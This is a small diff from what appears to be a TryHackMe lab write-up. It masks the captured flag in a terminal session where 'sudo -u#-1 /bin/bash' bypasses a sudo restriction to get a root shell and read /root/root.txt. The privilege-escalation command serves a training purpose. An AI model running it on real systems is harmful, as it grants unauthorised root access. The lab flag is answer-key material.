@@ -50,7 +50,7 @@ tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
 root@sudo-privesc:~# id
 uid=0(root) gid=1000(tryhackme) groups=1000(tryhackme)
 root@sudo-privesc:~# cat /root/root.txt
-THM{l33t_s3cur1ty_bypass}
+THM{l33t_sXXXXXXXty_byXXXXXss}
 
 ```
 
